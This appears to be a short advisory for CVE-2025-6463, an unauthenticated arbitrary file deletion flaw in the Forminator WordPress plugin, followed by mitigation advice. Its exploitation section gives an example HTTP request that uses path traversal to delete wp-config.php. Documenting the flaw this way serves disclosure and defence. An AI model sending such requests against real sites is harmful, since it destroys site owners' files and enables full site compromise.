# Forminator WordPress Plugin - Arbitrary File Deletion (CVE-2025-6463)

## Overview

A high-severity unauthenticated arbitrary file deletion vulnerability exists in the Forminator WordPress plugin. This flaw allows attackers to delete any file on the web server, including critical files such as `wp-config.php`.

## Vulnerability Details

- **CVE:** CVE-2025-6463
- **Type:** Arbitrary File Deletion
- **Authentication:** None (Unauthenticated)
- **Impact:** Deleting critical files can lead to Remote Code Execution (RCE) and full site compromise.

## Exploitation

Attackers send crafted HTTP requests to the plugin's file deletion endpoint. By manipulating the request, they can specify arbitrary files to delete on the server.

Example:

```http
POST /wp-admin/admin-ajax.php?action=forminator_delete_file HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

file=../../../../wp-config.php
```

Deleting `wp-config.php` or other critical files can cause the site to malfunction or allow attackers to upload malicious files and achieve RCE.

## Mitigation

- Update the Forminator plugin to the latest patched version.
- Monitor and restrict access to sensitive endpoints.
- Implement Web Application Firewall (WAF) rules to detect and block arbitrary file deletion attempts.
